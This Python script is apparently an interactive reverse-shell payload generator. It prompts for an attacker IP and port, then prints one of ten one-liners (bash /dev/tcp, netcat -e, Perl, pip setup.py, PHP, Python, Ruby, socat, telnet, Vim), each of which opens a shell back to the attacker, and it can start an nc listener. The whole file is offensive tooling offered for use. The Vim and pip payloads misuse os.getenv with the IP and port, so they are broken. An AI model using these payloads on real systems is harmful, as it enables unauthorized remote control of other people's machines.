import os

print("""
1)Bash            6)Python
2)Netcat          7)Ruby
3)Perl            8)Socat
4)Pip             9)Telnet
5)Php             10)Vim

""")

select = str(input("Select  Binary: "))
attackerip = str(input("Attacker IP: "))
attackerport = str(input("Attacker Port: "))

## PORT LISTEN
def listening ():
    listen = str(input("Listen Port?(Yes/No): "))
    if listen == "YES" or listen == "Yes" or listen == "yes":
        print(f"Listening on 0.0.0.0 {attackerport}")
        os.system(f"nc -lvp {attackerport}")
    elif listen == "NO" or listen == "No" or listen == "no":
        print("The End")
    else:
        print("Not Found.")

## PAYLOADS
bash = f"""bash -c 'exec bash -i &>/dev/tcp/{attackerip}/{attackerport} <&1'"""
vim = f"""
vim -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("{attackerip}"),int(os.getenv("{attackerport}"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'"""
telnet = f"""TF=$(mktemp -u);mkfifo $TF && telnet {attackerip} {attackerport} 0<$TF | sh 1>$TF"""
socat = f"""socat tcp-connect:{attackerip}:{attackerport} exec:/bin/sh,pty,stderr,setsid,sigint,sane"""
ruby = f"""ruby -rsocket -e'f=TCPSocket.open("{attackerip}",{attackerport}).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'"""
python = f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{attackerip}",{attackerport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
pip = f"""
TF=$(mktemp -d);echo 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("{attackerip}"),int(os.getenv("{attackerport}"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")' > $TF/setup.py
pip install $TF
"""
php = f"""php -r '$sock=fsockopen("{attackerip}",{attackerport});exec("sh <&3 >&3 2>&3");'"""
perl = f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{attackerip}:{attackerport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"""
nc = f"""nc -e /bin/sh {attackerip} {attackerport}"""




if select == "Bash" or select == "BASH" or select == "bash" or select == "1":
    print(f"""
    Payload is ;
    {bash}
    """)
    listening()

elif select == "Netcat" or select == "NETCAT" or select == "netcat" or select == "2":
    print(f"""
    Payload is ;
    {nc}
    """)
    listening()

elif select == "Perl" or select == "PERL" or select == "perl" or select == "3":
    print(f"""
    Payload is ;
    {perl}
    """)
    listening()

elif select == "Pip" or select == "PIP" or select == "pip" or select == "4":
    print(f"""
    Payload is ;
    {pip}
    """)
    listening()

elif select == "Php" or select == "PHP" or select == "php" or select == "5":
    print(f"""
    Payload is ;
    {php}
    """)
    listening()

elif select == "Python" or select == "PYTHON" or select == "python" or select == "6":
    print(f"""
    Payload is ;
    {python}
    """)
    listening()

elif select == "Ruby" or select == "RUBY" or select == "ruby" or select == "7":
    print(f"""
    Payload is ;
    {ruby}
    """)
    listening()

elif select == "Socat" or select == "SOCAT" or select == "socat" or select == "8":
    print(f"""
    Payload is ;
    {socat}
    """)
    listening()

elif select == "Telnet" or select == "TELNET" or select == "telnet" or select == "9":
    print(f"""
    Payload is ;
    {telnet}
    """)
    listening()

elif select == "Vim" or select == "VIM" or select == "vim" or select == "10":
    print(f"""
    Payload is ;
    {vim}
    """)
    listening()

else:
    print("Not Found.")